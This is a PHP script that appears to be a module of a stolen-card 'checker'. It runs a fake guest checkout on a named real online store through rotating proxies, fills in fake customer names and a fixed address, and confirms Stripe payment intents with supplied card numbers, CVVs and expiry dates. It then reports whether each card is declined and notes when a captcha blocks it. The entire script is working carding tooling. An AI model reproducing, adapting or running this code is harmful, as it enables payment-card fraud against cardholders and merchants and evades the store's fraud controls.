<?php

$retry = 0;

$isRetry = False;

start:

if ($isRetry) $retry++;

if ($retry > 2) {
	if (empty($empty)) $empty = 'Maximum Retrys Reached';

	$status = ['emoji' => '❌', 'status' => 'DECLINED', 'msg' => "RETRY - $empty!"];

	goto end;
}

$isRetry = True;

$server = $this->proxy();

$fake = $this->tools->GetUser();

$cookie = uniqid();

$r1 = $this->curlx->Get('https://protechonline.net/stainless-steel-hose-clamp', null, $cookie, $server['proxy']);

if (!$r1->success) goto start;

$chk_url = $this->getstr($this->getstr($r1->body, '<form data-product-sku="', ' method'), 'action="', '"');

$form_key = trim(strip_tags($this->getstr($r1->body, '<input name="form_key" type="hidden" value="', '"')));

if (empty($chk_url) || empty($form_key)) {
	$empty = 'Form Key is Empty';

	goto start;
}

$data = 'product=7685&selected_configurable_option=&related_product=&item=7685&form_key='.$form_key.'&options[1531]=5250&qty=1';

$headers = [
	'cookie: go=go; form_key='.$form_key
];

$r2 = $this->curlx->Post($chk_url, $data, $headers, $cookie, $server['proxy']);

if (!$r2->success) goto start;

$err = $this->getstr(urldecode($this->getstr($r2->headers->response['Set-Cookie'] ?? '', 'mage-messages=', ';')), 'error","text":"', '"');

if (!empty($err)) {
	$empty = $err;

	goto start;
}

$r3 = $this->curlx->Get('https://protechonline.net/checkout/', null, $cookie, $server['proxy']);

if (!$r3->success) goto start;

$entity_id = trim(strip_tags($this->getstr($r3->body, 'entity_id":"', '"')));

if (empty($entity_id)) {
	$empty = 'Third Request Token is Empty';

	goto start;
}

$data = '{"addressInformation":{"shipping_address":{"countryId":"US","regionId":"43","regionCode":"NY","region":"New York","street":["12 main street"],"company":"","telephone":"2564567654","postcode":"10509","city":"Brewster","firstname":"'.$fake->first.'","lastname":"'.$fake->last.'","extension_attributes":{"shipperhq_option_values":{"destination_type":"","inside_delivery":"0","liftgate_required":"0","limited_delivery":"0","notify_required":"0","customer_carrier":"","customer_carrier_ph":"","customer_carrier_account":""}}},"billing_address":{"countryId":"US","regionId":"43","regionCode":"NY","region":"New York","street":["12 main street"],"company":"","telephone":"2564567654","postcode":"10509","city":"Brewster","firstname":"'.$fake->first.'","lastname":"'.$fake->last.'","saveInAddressBook":null},"shipping_method_code":"GND","shipping_carrier_code":"shqups2","extension_attributes":{}}}';

$headers = [
	'content-type: application/json',
	'x-requested-with: XMLHttpRequest'
];

$r4 = $this->curlx->Post('https://protechonline.net/rest/pto/V1/guest-carts/'.$entity_id.'/shipping-information', $data, $headers, $cookie, $server['proxy']);

if (!$r4->success) goto start;

$r5 = $this->curlx->Get('https://protechonline.net/rest/pto/V1/stripe/payments/get_client_secret', null, $cookie, $server['proxy']);

if (!$r5->success) goto start;

$clientSecret = $this->getstr($r5->body, 'clientSecret\":\"', '\"');

$pi_id = explode('_secret_', $clientSecret)[0];

if (empty($pi_id)) {
	$empty = 'Fifth Request Token is Empty';

	goto start;
}

$data = 'return_url=https%3A%2F%2Fprotechonline.net%2Fstripe%2Fpayment%2Findex%2F&payment_method_data[billing_details][address][state]=New+York&payment_method_data[billing_details][address][postal_code]=10509&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][city]=Brewster&payment_method_data[billing_details][address][line1]=12+main+street&payment_method_data[billing_details][email]='.$fake->email.'&payment_method_data[billing_details][name]='.$fake->first.'+'.$fake->last.'&payment_method_data[billing_details][phone]=2564567654&payment_method_data[type]=card&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_year]='.$yy.'&payment_method_data[card][exp_month]='.$mm.'&payment_method_data[payment_user_agent]=stripe.js%2F8992977ce%3B+stripe-js-v3%2F8992977ce%3B+payment-element&payment_method_data[time_on_page]='.rand(50000, 100000).'&payment_method_data[guid]=NA&payment_method_data[muid]=NA&payment_method_data[sid]=NA&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_jvhZLTM82PxceRvzpVukETCu&client_secret='.$clientSecret.'';

$r6 = $this->curlx->Post('https://api.stripe.com/v1/payment_intents/'.$pi_id.'/confirm', $data, null, $cookie, $server['proxy']);

if (!$r6->success) {
	$empty = ''.$r6->error.'! ('.intval($r6->errno).')';

	goto start;
}

if (strpos($r6->body, 'verify_challenge') !== false) {
	$empty = 'Sixth Request Contains HCaptcha!';

	goto start;
}

$json_r6 = json_decode($r6->body);

if (isset($json_r6->error)) {
	$status = $this->response->ErrorHandler($json_r6->error);

	goto end;
}

$status = $this->response->Stripe($r6->body);

end: